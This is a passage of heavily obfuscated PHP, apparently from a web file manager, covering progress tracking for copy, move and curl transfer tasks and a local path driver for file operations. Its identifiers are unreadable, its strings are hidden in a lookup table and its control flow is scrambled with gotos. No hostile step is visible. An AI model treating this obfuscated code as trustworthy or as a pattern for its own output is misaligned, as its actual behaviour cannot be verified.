Hook::bind($d≤û–Îçª°[509], array($this, $d≤û–Îçª°[1471])); Hook::bind($d≤û–Îçª°[506], array($this, $d≤û–Îçª°[1471])); goto c¯˘¥‡Ëé»; CÍÏÑ∂⁄ú€: Hook::bind($d≤û–Îçª°[539], array($this, $d≤û–Îçª°[1468])); Hook::bind($d≤û–Îçª°[540], array($this, $d≤û–Îçª°[1469])); Hook::bind($d≤û–Îçª°[542], array($this, $d≤û–Îçª°[1470])); goto døÜá¬Ö»‰; bãÃâ»ãé∏: Hook::bind($d≤û–Îçª°[1462], array($this, $d≤û–Îçª°[1463])); Hook::bind($d≤û–Îçª°[1464], array($this, $d≤û–Îçª°[1465])); Hook::bind($d≤û–Îçª°[1466], array($this, $d≤û–Îçª°[1467])); goto CÍÏÑ∂⁄ú€; c¯˘¥‡Ëé»: Hook::bind($d≤û–Îçª°[511], array($this, $d≤û–Îçª°[1471])); Hook::bind($d≤û–Îçª°[513], array($this, $d≤û–Îçª°[1471])); Hook::bind($d≤û–Îçª°[515], array($this, $d≤û–Îçª°[1471])); goto eóŒäÒ∫¿ø; c¶√‡âÂ˜à: $dØøâ¨®ºñ[$d≤û–Îçª°[982]] = $d≤û–Îçª°[33]; $dØøâ¨®ºñ[$d≤û–Îçª°[1485]] = $d≤û–Îçª°[33]; $dØøâ¨®ºñ[$d≤û–Îçª°[1486]] = 0; goto cÕ∫Éòıé´; C£Ò∑˜„ô–: $dØøâ¨®ºñ[$d≤û–Îçª°[1481]] = LNG($d≤û–Îçª°[1482]); $dØøâ¨®ºñ[$d≤û–Îçª°[1483]] = 0; $dØøâ¨®ºñ[$d≤û–Îçª°[1484]] = 0; goto c¶√‡âÂ˜à; cÕ∫Éòıé´: $dØøâ¨®ºñ[$d≤û–Îçª°[1487]] = 0; $dØøâ¨®ºñ[$d≤û–Îçª°[1488]] = 0; if (!$dØøâ¨®ºñ[$d≤û–Îçª°[1344]]) { $dØøâ¨®ºñ[$d≤û–Îçª°[1344]] = LNG($d≤û–Îçª°[1489]); } goto F‘È¡úôû∫; B™‹Æ≤ôë: Hook::bind($d≤û–Îçª°[1475], array($this, $d≤û–Îçª°[1476])); Hook::bind($d≤û–Îçª°[1477], array($this, $d≤û–Îçª°[1478])); Hook::bind($d≤û–Îçª°[1479], array($this, $d≤û–Îçª°[1480])); goto C£Ò∑˜„ô–; F‘È¡úôû∫: } protected function endAfter() { goto Fô÷Ú—ËΩ÷; Fô÷Ú—ËΩ÷: $aØûá„Çª∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; Hook::unbind($aØûá„Çª∂[1462], array($this, $aØûá„Çª∂[1463])); Hook::unbind($aØûá„Çª∂[1464], array($this, $aØûá„Çª∂[1465])); goto CÓá—Çπ°ù; aäÿüÀ≈„î: Hook::unbind($aØûá„Çª∂[542], array($this, $aØûá„Çª∂[1470])); Hook::unbind($aØûá„Çª∂[543], array($this, $aØûá„Çª∂[1470])); Hook::unbind($aØûá„Çª∂[509], array($this, $aØûá„Çª∂[1471])); goto FÍ≥Ûëˆ„”; FÍ≥Ûëˆ„”: Hook::unbind($aØûá„Çª∂[506], array($this, $aØûá„Çª∂[1471])); Hook::unbind($aØûá„Çª∂[511], array($this, $aØûá„Çª∂[1471])); Hook::unbind($aØûá„Çª∂[513], array($this, $aØûá„Çª∂[1471])); goto d◊ÆõÚÖßÆ; CÓá—Çπ°ù: Hook::unbind($aØûá„Çª∂[1466], array($this, $aØûá„Çª∂[1467])); Hook::unbind($aØûá„Çª∂[539], array($this, $aØûá„Çª∂[1468])); Hook::unbind($aØûá„Çª∂[540], array($this, $aØûá„Çª∂[1469])); goto aäÿüÀ≈„î; f›±–…¬ØÖ: Hook::unbind($aØûá„Çª∂[1475], array($this, $aØûá„Çª∂[1476])); Hook::unbind($aØûá„Çª∂[1477], array($this, $aØûá„Çª∂[1478])); Hook::unbind($aØûá„Çª∂[1479], array($this, $aØûá„Çª∂[1480])); goto f˘í€ôÀ∆π; d◊ÆõÚÖßÆ: Hook::unbind($aØûá„Çª∂[515], array($this, $aØûá„Çª∂[1471])); Hook::unbind($aØûá„Çª∂[1472], array($this, $aØûá„Çª∂[1473])); Hook::unbind($aØûá„Çª∂[532], array($this, $aØûá„Çª∂[1474])); goto f›±–…¬ØÖ; f˘í€ôÀ∆π: } public function copyMoveStart($f·áÛè¡Çµ, $eÀºˆÿß±Ÿ, $F≠ îœêåî, $DÌÎú¥„ÍÉ) { goto AµÜÒñïËë; Dù◊ë¶ôËÏ: if (substr($eÀºˆÿß±Ÿ, 0, strlen($a€Ç›ü∆ù≤)) == $a€Ç›ü∆ù≤) { return; } if (substr($DÌÎú¥„ÍÉ, 0, strlen($a€Ç›ü∆ù≤)) == $a€Ç›ü∆ù≤) { return; } $Eù¶ßÖ¯∑ï =& $this->task; goto c›Ñ‰©◊∫; AµÜÒñïËë: $d¡““å£°Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::log($d¡““å£°Í[1490] . $eÀºˆÿß±Ÿ . $d¡““å£°Í[66] . $DÌÎú¥„ÍÉ); $a€Ç›ü∆ù≤ = rtrim(TEMP_FILES, $d¡““å£°Í[8]); goto Dù◊ë¶ôËÏ; c›Ñ‰©◊∫: $Eù¶ßÖ¯∑ï[$d¡““å£°Í[1491]] = KodIO::transferType($f·áÛè¡Çµ, $F≠ îœêåî); $this->update(); goto D—ØÇàäíÛ; D—ØÇàäíÛ: } public function updateAfter() { goto B∆à‡®µ´ç; Fôÿº°á†Œ: if ($this->sourceModelCopyFlag) { return; } if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1491]] == $e≈ÂœâàŸá[1098]) { return; } if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1491]] == $e≈ÂœâàŸá[1044] || $dÛÎéàˆÇï[$e≈ÂœâàŸá[1491]] == $e≈ÂœâàŸá[103]) { if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1485]]) { $dÛÎéàˆÇï[$e≈ÂœâàŸá[1488]] = $dÛÎéàˆÇï[$e≈ÂœâàŸá[1487]] + $dÛÎéàˆÇï[$e≈ÂœâàŸá[1484]]; } } else { if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1491]] == $e≈ÂœâàŸá[1099]) { if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1485]] == $e≈ÂœâàŸá[1044]) { $dÛÎéàˆÇï[$e≈ÂœâàŸá[1488]] = $dÛÎéàˆÇï[$e≈ÂœâàŸá[1487]] + $dÛÎéàˆÇï[$e≈ÂœâàŸá[1484]] * 0.5; } else { if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1485]] == $e≈ÂœâàŸá[103]) { $dÛÎéàˆÇï[$e≈ÂœâàŸá[1488]] = $dÛÎéàˆÇï[$e≈ÂœâàŸá[1487]] + $dÛÎéàˆÇï[$e≈ÂœâàŸá[1483]] * 0.5 + $dÛÎéàˆÇï[$e≈ÂœâàŸá[1484]] * 0.5; } } } } goto Cä≈„óå±•; B∆à‡®µ´ç: $e≈ÂœâàŸá =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÛÎéàˆÇï =& $this->task; if (!$dÛÎéàˆÇï[$e≈ÂœâàŸá[698]]) { return; } goto Fôÿº°á†Œ; Cä≈„óå±•: $dÛÎéàˆÇï[$e≈ÂœâàŸá[1439]] = $dÛÎéàˆÇï[$e≈ÂœâàŸá[1488]] / $dÛÎéàˆÇï[$e≈ÂœâàŸá[698]]; if ($dÛÎéàˆÇï[$e≈ÂœâàŸá[1439]] > 0) { $Dœ√€Ï¨áû = timeFloat() - $dÛÎéàˆÇï[$e≈ÂœâàŸá[1441]] - $dÛÎéàˆÇï[$e≈ÂœâàŸá[1444]]; $dÛÎéàˆÇï[$e≈ÂœâàŸá[1445]] = $Dœ√€Ï¨áû * (1 - $dÛÎéàˆÇï[$e≈ÂœâàŸá[1439]]) / $dÛÎéàˆÇï[$e≈ÂœâàŸá[1439]]; } goto e¯à›⁄±ì; e¯à›⁄±ì: } public function addPath($aé´ç‡ãçÙ) { goto Dı◊âÑ∞ùŒ; d¿Õ†∂âÎ◊: $cŒƒÃπı∆ = IO::infoWithChildren($aé´ç‡ãçÙ); $aøÓÇﬂÓæ≥ = $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[1492]] ? $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[1492]][$DÓÿöØ”à‚[1493]] : 0; $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[1492]] = array($DÓÿöØ”à‚[1493] => $aøÓÇﬂÓæ≥ + 1, $DÓÿöØ”à‚[386] => $cŒƒÃπı∆[$DÓÿöØ”à‚[28]], $DÓÿöØ”à‚[75] => $cŒƒÃπı∆[$DÓÿöØ”à‚[75]], $DÓÿöØ”à‚[466] => $cŒƒÃπı∆[$DÓÿöØ”à‚[466]] ? $cŒƒÃπı∆[$DÓÿöØ”à‚[466]] : $cŒƒÃπı∆[$DÓÿöØ”à‚[75]]); goto d‚ÑÍ™Ø‘ú; d‚ÑÍ™Ø‘ú: if ($cŒƒÃπı∆[$DÓÿöØ”à‚[29]] == $DÓÿöØ”à‚[167]) { $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[980]] += 1; } else { $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[980]] += $cŒƒÃπı∆[$DÓÿöØ”à‚[80]][$DÓÿöØ”à‚[78]]; if ($cŒƒÃπı∆[$DÓÿöØ”à‚[369]]) { $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[980]] += $cŒƒÃπı∆[$DÓÿöØ”à‚[80]][$DÓÿöØ”à‚[79]] + 1; } } $aù¬˘Ñå¢¿[$DÓÿöØ”à‚[698]] += $cŒƒÃπı∆[$DÓÿöØ”à‚[77]]; $this->update(); goto Dõ”é∂®„¨; Dı◊âÑ∞ùŒ: $DÓÿöØ”à‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$aé´ç‡ãçÙ) { return; } $aù¬˘Ñå¢¿ =& $this->task; goto d¿Õ†∂âÎ◊; Dõ”é∂®„¨: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($AÔÉ«π∏è€) { $bí∑ÇøâÀ“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÿ„Ø ﬁﬂÎ =& $this->task; $bÿ„Ø ﬁﬂÎ[$bí∑ÇøâÀ“[1481]] = $AÔÉ«π∏è€[$bí∑ÇøâÀ“[28]]; $bÿ„Ø ﬁﬂÎ[$bí∑ÇøâÀ“[982]] = $AÔÉ«π∏è€[$bí∑ÇøâÀ“[28]]; $this->update(); } public function copyFileStart($BÏ—®±Öœß, $EÎ∞…Ω≈÷˜, $C¬àö¡È˜Ó, $c¨√ ⁄ëëå, $C ‚ú‚ÀﬂØ, $Fœã‘√â›Ø) { goto fƒãá“ƒ°°; aøúß≈Îê»: $B¥’‡àÍç€[$d®≈¯€ÊÊ[982]] = $d®≈¯€ÊÊ[33]; $B¥’‡àÍç€[$d®≈¯€ÊÊ[1485]] = $d®≈¯€ÊÊ[33]; $B¥’‡àÍç€[$d®≈¯€ÊÊ[1486]] = 0; goto bÀã≈Èˆ”; f™èÊöì∫’: $B¥’‡àÍç€[$d®≈¯€ÊÊ[1481]] = $fˆÌﬁ©èø´; $B¥’‡àÍç€[$d®≈¯€ÊÊ[1483]] = (int) $BÏ—®±Öœß->size($EÎ∞…Ω≈÷˜); $B¥’‡àÍç€[$d®≈¯€ÊÊ[1484]] = 0; goto aøúß≈Îê»; fƒãá“ƒ°°: $d®≈¯€ÊÊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fˆÌﬁ©èø´ = $C ‚ú‚ÀﬂØ; if ($fˆÌﬁ©èø´ == $GLOBALS[$d®≈¯€ÊÊ[1494]]) { $fˆÌﬁ©èø´ = $GLOBALS[$d®≈¯€ÊÊ[1495]]; } goto DÒ„¿πΩøÎ; DÒ„¿πΩøÎ: $GLOBALS[$d®≈¯€ÊÊ[1495]] = $C ‚ú‚ÀﬂØ; $GLOBALS[$d®≈¯€ÊÊ[1494]] = $Fœã‘√â›Ø; $B¥’‡àÍç€ =& $this->task; goto f™èÊöì∫’; bÀã≈Èˆ”: $this->update(); goto fãüµøòäÔ; fãüµøòäÔ: } public function copyFileEnd($F«ù∑¬ø¡◊, $f—∞Âˆò∞∂, $cå≈È‰·Õó, $aØùçŒáüà, $b∆±∞Í»ôÓ, $b˘ﬂÃ›¿©–) { $F¡œ‚Æª‡° =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bá·à˜€Ûæ =& $this->task; $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1484]] = $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1483]]; $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1485]] = $F¡œ‚Æª‡°[33]; if ($b∆±∞Í»ôÓ == $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1481]]) { $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1487]] += $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1483]]; $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1488]] = $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1487]]; $this->update(1); } else { $this->update(); $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1484]] = 0; } self::log($F¡œ‚Æª‡°[1496] . $f—∞Âˆò∞∂ . $F¡œ‚Æª‡°[66] . $aØùçŒáüà . $F¡œ‚Æª‡°[217] . $b∆±∞Í»ôÓ . $F¡œ‚Æª‡°[1497] . $Bá·à˜€Ûæ[$F¡œ‚Æª‡°[1481]]); } public function updateFileEnd($CﬁÚòπâ≥Ö, $bÀ«¨‹¯◊Ω) { goto Bâ¿€û¯ì⁄; AóÓå√Ç¿∫: $this->update(1); self::log($D·’¶¥Úô[1498] . $CﬁÚòπâ≥Ö); goto cïû©‘€≈ü; e√§œ·ÿ¥˜: $d°∂’ï˘≤∏[$D·’¶¥Úô[1483]] = $bÀ«¨‹¯◊Ω; $d°∂’ï˘≤∏[$D·’¶¥Úô[1487]] += $bÀ«¨‹¯◊Ω; $d°∂’ï˘≤∏[$D·’¶¥Úô[1488]] = $d°∂’ï˘≤∏[$D·’¶¥Úô[1487]]; goto AóÓå√Ç¿∫; Bâ¿€û¯ì⁄: $D·’¶¥Úô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d°∂’ï˘≤∏ =& $this->task; $d°∂’ï˘≤∏[$D·’¶¥Úô[1481]] = $CﬁÚòπâ≥Ö; goto e√§œ·ÿ¥˜; cïû©‘€≈ü: } public function sourceModelCopy($F⁄°¬Íıï) { goto Cƒ⁄èŸË≈µ; e•ﬂµäåΩõ: switch ($F∫à˘Ÿ∆Öí) { case $Aéœ¶‰˜‘[507]: $FçÎﬂå≈ß≠ = 1; break; case $Aéœ¶‰˜‘[510]: $fÔññéÌäÑ[$Aéœ¶‰˜‘[1481]] = $E´÷úåﬁÀâ[$Aéœ¶‰˜‘[28]]; break; case $Aéœ¶‰˜‘[512]: $FçÎﬂå≈ß≠ = intval($F⁄°¬Íıï[$Aéœ¶‰˜‘[363]] * 0.4); break; case $Aéœ¶‰˜‘[514]: $FçÎﬂå≈ß≠ = intval($F⁄°¬Íıï[$Aéœ¶‰˜‘[363]] * 0.2); break; case $Aéœ¶‰˜‘[516]: $FçÎﬂå≈ß≠ = intval($F⁄°¬Íıï[$Aéœ¶‰˜‘[363]] * 0.4); break; } $this->update($FçÎﬂå≈ß≠); $this->sourceModelCopyFlag = !1; goto d»‹êû∆ù≤; c¡≤÷îâ∞ú: $fÔññéÌäÑ =& $this->task; $this->sourceModelCopyFlag = !0; $FçÎﬂå≈ß≠ = 0; goto e•ﬂµäåΩõ; Cƒ⁄èŸË≈µ: $Aéœ¶‰˜‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F∫à˘Ÿ∆Öí = $F⁄°¬Íıï[0]; $E´÷úåﬁÀâ = $F⁄°¬Íıï[1]; goto c¡≤÷îâ∞ú; d»‹êû∆ù≤: } public function sourceRemove($b’≥≈Áà∏ô, $d…≤˜çÖﬂÀ) { $Aè≤Ö∑ß≠Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->sourceModelCopyFlag = !0; $c‘çœîËŸÏ = 1; if (isset($b’≥≈Áà∏ô[$Aè≤Ö∑ß≠Ñ[80]])) { $c‘çœîËŸÏ = $b’≥≈Áà∏ô[$Aè≤Ö∑ß≠Ñ[80]][$Aè≤Ö∑ß≠Ñ[78]] + $b’≥≈Áà∏ô[$Aè≤Ö∑ß≠Ñ[80]][$Aè≤Ö∑ß≠Ñ[79]] + 1; } $this->update($c‘çœîËŸÏ); $this->sourceModelCopyFlag = !1; } public function sourceMove($B›„∆µÃ‹û) { $this->sourceRemove($B›„∆µÃ‹û, !1); } public function curlProgress($fú…£î…õú, $eƒÇ¡Ûã∑û, $b∂®ç«ôœ∞, $bá˜≥£Ø¡ì, $düã‚¿â˘ë) { $aﬂœ∫ç⁄“† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $câˆÑë∑â« =& $this->task; if ($düã‚¿â˘ë > 0) { $câˆÑë∑â«[$aﬂœ∫ç⁄“†[982]] = $aﬂœ∫ç⁄“†[1499]; $câˆÑë∑â«[$aﬂœ∫ç⁄“†[1485]] = $aﬂœ∫ç⁄“†[103]; if ($câˆÑë∑â«[$aﬂœ∫ç⁄“†[1483]] == $bá˜≥£Ø¡ì || $bá˜≥£Ø¡ì > 1024 * 1024) { $câˆÑë∑â«[$aﬂœ∫ç⁄“†[1484]] = $düã‚¿â˘ë; } if ($câˆÑë∑â«[$aﬂœ∫ç⁄“†[1486]]) { $câˆÑë∑â«[$aﬂœ∫ç⁄“†[1484]] = $düã‚¿â˘ë + $câˆÑë∑â«[$aﬂœ∫ç⁄“†[1486]]; } } else { if ($b∂®ç«ôœ∞ > 0) { if ($câˆÑë∑â«[$aﬂœ∫ç⁄“†[1483]] == $eƒÇ¡Ûã∑û) { $câˆÑë∑â«[$aﬂœ∫ç⁄“†[1484]] = $b∂®ç«ôœ∞; $câˆÑë∑â«[$aﬂœ∫ç⁄“†[982]] = $aﬂœ∫ç⁄“†[1500]; $câˆÑë∑â«[$aﬂœ∫ç⁄“†[1485]] = $aﬂœ∫ç⁄“†[1044]; } } } $this->update(); } public function curlProgressStart($AﬁË€–‡ÿﬂ) { } public function curlProgressEnd($Bë’„Ö¶Ñé) { $a™ä≈ëﬂÁò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dé≥Éˆ…Œå =& $this->task; $aﬂ ÿÑ‹º = curl_getinfo($Bë’„Ö¶Ñé); $b‚˘∂Ì©ïÂ = $aﬂ ÿÑ‹º[$a™ä≈ëﬂÁò[1501]]; if ($Dé≥Éˆ…Œå[$a™ä≈ëﬂÁò[1485]] == $a™ä≈ëﬂÁò[103] && $b‚˘∂Ì©ïÂ) { $Dé≥Éˆ…Œå[$a™ä≈ëﬂÁò[1486]] += $b‚˘∂Ì©ïÂ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $c√§ÍõÒ≠ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÇ®êèÂÂë =& $this->task; $BÇ®êèÂÂë[$c√§ÍõÒ≠ç[1502]] = 1; Hook::bind($c√§ÍõÒ≠ç[1475], array($this, $c√§ÍõÒ≠ç[1503])); Hook::bind($c√§ÍõÒ≠ç[1477], array($this, $c√§ÍõÒ≠ç[1504])); Hook::bind($c√§ÍõÒ≠ç[1479], array($this, $c√§ÍõÒ≠ç[1505])); } protected function endAfter() { $Fê∫çöä¢ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; Hook::unbind($Fê∫çöä¢ü[1475], array($this, $Fê∫çöä¢ü[1503])); Hook::unbind($Fê∫çöä¢ü[1477], array($this, $Fê∫çöä¢ü[1504])); Hook::unbind($Fê∫çöä¢ü[1479], array($this, $Fê∫çöä¢ü[1505])); } public function progressStart($aΩñ‡ïÀÍœ) { $A¯ì˘πßà∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B«∞¢§ì◊§ = curl_getinfo($aΩñ‡ïÀÍœ); self::log($A¯ì˘πßà∆[1506] . $B«∞¢§ì◊§[$A¯ì˘πßà∆[295]]); self::valueSet($this->task[$A¯ì˘πßà∆[367]], $this->task); } public function progressEnd($aË‹Ù±öÉÊ) { $AΩ¬ÎıåÒ™ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::log($AΩ¬ÎıåÒ™[1507] . $this->task[$AΩ¬ÎıåÒ™[367]]); $this->end(); } public function progress($dŸ†Ñ≈¡˘è, $eÏªËß¿√≤, $BÓ«÷¶ã„Î, $Bñ»àâ†ãÙ, $Bé·Ë¬æûΩ) { $eíìÑÇÒëë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E™à¿÷´µÁ =& $this->task; if ($Bé·Ë¬æûΩ > 0) { $E™à¿÷´µÁ[$eíìÑÇÒëë[980]] = $E™à¿÷´µÁ[$eíìÑÇÒëë[980]] == 0 ? $Bñ»àâ†ãÙ : $E™à¿÷´µÁ[$eíìÑÇÒëë[980]]; $E™à¿÷´µÁ[$eíìÑÇÒëë[994]] = $Bé·Ë¬æûΩ; } else { if ($BÓ«÷¶ã„Î > 0) { $E™à¿÷´µÁ[$eíìÑÇÒëë[980]] = $E™à¿÷´µÁ[$eíìÑÇÒëë[980]] == 0 ? $eÏªËß¿√≤ : $E™à¿÷´µÁ[$eíìÑÇÒëë[980]]; $E™à¿÷´µÁ[$eíìÑÇÒëë[994]] = $BÓ«÷¶ã„Î; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\x73\x73\x48\x74\x74\x70\x3a\144\157\x77\156\x3a{$BÓ«÷¶ã„Î}\57{$eÏªËß¿√≤}\x3b\40\165\160\154\x6f\x61\x64\x3a{$Bé·Ë¬æûΩ}\57{$Bñ»àâ†ãÙ}\73"); } } goto AÓ∏Òã‹›è; C·ëŸÈ£Ñá: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($F«âíè…ù«) { if (substr($F«âíè…ù«, 0, 2) == $_SERVER[Ä¿¡‡öóµŸﬂ‡][1158]) { $F«âíè…ù« = BASIC_PATH . substr($F«âíè…ù«, 2); } return $F«âíè…ù«; } public function iconvApp($C£Ú∞⁄ÖÂø) { $AÑ—ﬁØÕóŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $config; return $this->iconvTo($C£Ú∞⁄ÖÂø, $config[$AÑ—ﬁØÕóŒ[1156]], $config[$AÑ—ﬁØÕóŒ[1155]]); } public function iconvSystem($d’ãÇ‰‘Á›) { $dƒëΩùæ“è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $config; return $this->iconvTo($d’ãÇ‰‘Á›, $config[$dƒëΩùæ“è[1155]], $config[$dƒëΩùæ“è[1156]]); } public function getPathOuter($dÓ∫Ú§∑ß¡) { goto FòËÿèÒÛñ; a°Áöö«Úé: return $this->pathDriver . $eÔ‰çç·‹›[8] . ltrim($dÓ∫Ú§∑ß¡, $eÔ‰çç·‹›[8]); goto c¨ü¶íê±®; BˆèÙ≈åäƒ: if (substr($AàæÚ§“¡í, 0, 2) == $eÔ‰çç·‹›[1158]) { $AàæÚ§“¡í = BASIC_PATH . substr($AàæÚ§“¡í, 2); } if (substr($dÓ∫Ú§∑ß¡, 0, 2) == $eÔ‰çç·‹›[1158]) { $dÓ∫Ú§∑ß¡ = BASIC_PATH . substr($dÓ∫Ú§∑ß¡, 2); } $AàæÚ§“¡í = KodIO::clear($AàæÚ§“¡í); goto B´¬„òˆ ì; B´¬„òˆ ì: $dÓ∫Ú§∑ß¡ = KodIO::clear($dÓ∫Ú§∑ß¡); $dÓ∫Ú§∑ß¡ = substr($dÓ∫Ú§∑ß¡, strlen($AàæÚ§“¡í)); if (empty($this->pathDriver)) { return $dÓ∫Ú§∑ß¡; } goto a°Áöö«Úé; FòËÿèÒÛñ: $eÔ‰çç·‹› =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AàæÚ§“¡í = $this->iconvApp($this->pathBase); $dÓ∫Ú§∑ß¡ = $this->iconvApp($dÓ∫Ú§∑ß¡); goto BˆèÙ≈åäƒ; c¨ü¶íê±®: } public function mkfile($fπè“–ñ‰”, $bïƒ≈ áÊ– = '', $d≤ØÃ∫éﬂπ = REPEAT_RENAME) { $fπè“–ñ‰” = $this->iconvSystem($fπè“–ñ‰”); @touch($fπè“–ñ‰”); if ($bïƒ≈ áÊ–) { file_put_contents($fπè“–ñ‰”, $bïƒ≈ áÊ–); } return is_file($fπè“–ñ‰”) ? $this->getPathOuter($fπè“–ñ‰”) : !1; } public function mkdir($bñò¥áöã”, $FÌ€±⁄‰®· = REPEAT_SKIP) { $bñò¥áöã” = $this->iconvSystem($bñò¥áöã”); if (is_dir($bñò¥áöã”)) { return $this->getPathOuter($bñò¥áöã”); } @mkdir($bñò¥áöã”, 511, !0); return is_dir($bñò¥áöã”) ? $this->getPathOuter($bñò¥áöã”) : !1; } public function copyFile($c¢ÉææÎ°∂, $dÇ°æª¡„ï) { $this->mkdir($this->pathFather($dÇ°æª¡„ï)); $c¢ÉææÎ°∂ = $this->iconvSystem($c¢ÉææÎ°∂); $dÇ°æª¡„ï = $this->iconvSystem($dÇ°æª¡„ï); $Då‘öÈÁ≥≈ = @copy($c¢ÉææÎ°∂, $dÇ°æª¡„ï); return $Då‘öÈÁ≥≈ ? $this->getPathOuter($dÇ°æª¡„ï) : !1; } public function moveFile($cıµ‘æ∏Âñ, $fÿµ¥©â⁄º) { $this->mkdir($this->pathFather($fÿµ¥©â⁄º)); $cıµ‘æ∏Âñ = $this->iconvSystem($cıµ‘æ∏Âñ); $fÿµ¥©â⁄º = $this->iconvSystem($fÿµ¥©â⁄º); $eŒà™˜´íÜ = intval(@rename($cıµ‘æ∏Âñ, $fÿµ¥©â⁄º)); if (!$eŒà™˜´íÜ) { if ($eŒà™˜´íÜ = intval(@copy($cıµ‘æ∏Âñ, $fÿµ¥©â⁄º))) { @unlink($cıµ‘æ∏Âñ); } } return $eŒà™˜´íÜ ? $this->getPathOuter($fÿµ¥©â⁄º) : !1; } public function delFile($E∞Çü ó¶») { $E∞Çü ó¶» = $this->iconvSystem($E∞Çü ó¶»); if (!@unlink($E∞Çü ó¶»)) { @chmod($E∞Çü ó¶», 511); if (!@unlink($E∞Çü ó¶»)) { return !1; } } else { return !0; } } public function delFolder($Bùœò√íçâ) { goto A ºÎΩáº™; AÈ‚¯Æ‘àÑ: if (!($e∏∞Ñç†úè = opendir($Bùœò√íçâ))) { return !1; } while (($bœëŒïëÕä = readdir($e∏∞Ñç†úè)) !== !1) { if ($bœëŒïëÕä == $Dúêıõßœª[91] || $bœëŒïëÕä == $Dúêıõßœª[1168]) { continue; } $EëÇï¯∆‚€ = $Bùœò√íçâ . $Dúêıõßœª[8] . $bœëŒïëÕä; if (is_file($EëÇï¯∆‚€) || is_link($EëÇï¯∆‚€)) { if (!unlink($EëÇï¯∆‚€)) { chmod($EëÇï¯∆‚€, 511); if (!unlink($EëÇï¯∆‚€)) { return !1; } } } else { if (is_dir($EëÇï¯∆‚€)) { chmod($EëÇï¯∆‚€, 511); $EëÇï¯∆‚€ = $this->iconvApp($EëÇï¯∆‚€); if (!$this->delFolder($EëÇï¯∆‚€)) { return !1; } } } } closedir($e∏∞Ñç†úè); goto dôâúñ’™·; dôâúñ’™·: return rmdir($Bùœò√íçâ); goto DÏãíÚæÙ¶; A ºÎΩáº™: $Dúêıõßœª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bùœò√íçâ = $this->iconvSystem($Bùœò√íçâ); if (!is_dir($Bùœò√íçâ)) { return !0; } goto AÈ‚¯Æ‘àÑ; DÏãíÚæÙ¶: } public function rename($Cﬁæ¥ñ–Ûœ, $F†ä¥ä·ﬂñ) { goto d¢·èË≥å◊; a–•‘‹ú´’: $BÔÊ©πàîß = @rename($Cﬁæ¥ñ–Ûœ, $aÍ·‹¢ªŸ≥); $aÍ·‹¢ªŸ≥ = $this->iconvApp($aÍ·‹¢ªŸ≥); return $BÔÊ©πàîß ? $this->getPathOuter($aÍ·‹¢ªŸ≥) : !1; goto Fü©õﬂèîŒ; eÌË”±”±Ë: $Cﬁæ¥ñ–Ûœ = $this->iconvSystem($Cﬁæ¥ñ–Ûœ); $c≤ç⁄Ñãîà = $this->pathFather($Cﬁæ¥ñ–Ûœ); $aÍ·‹¢ªŸ≥ = rtrim($c≤ç⁄Ñãîà, $bçƒÌË©†™[8]) . $bçƒÌË©†™[8] . $EŒË®ÙÔÓà; goto a–•‘‹ú´’; d¢·èË≥å◊: $bçƒÌË©†™ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EŒË®ÙÔÓà = $this->fileNameAuto($this->pathFather($Cﬁæ¥ñ–Ûœ), $F†ä¥ä·ﬂñ); $EŒË®ÙÔÓà = $this->iconvSystem($EŒË®ÙÔÓà); goto eÌË”±”±Ë; Fü©õﬂèîŒ: } public function size($d´ãı≤û¬À) { $d´ãı≤û¬À = $this->iconvSystem($d´ãı≤û¬À); return (double) abs(sprintf($_SERVER[Ä¿¡‡öóµŸﬂ‡][1170], @filesize($d´ãı≤û¬À))); } public function info($BÊÇ‘¬âµÀ) { $BÊÇ‘¬âµÀ = $this->iconvSystem($BÊÇ‘¬âµÀ); if ($this->isFolder($BÊÇ‘¬âµÀ)) { return $this->folderInfo($BÊÇ‘¬âµÀ); } else { if ($this->isFile($BÊÇ‘¬âµÀ)) 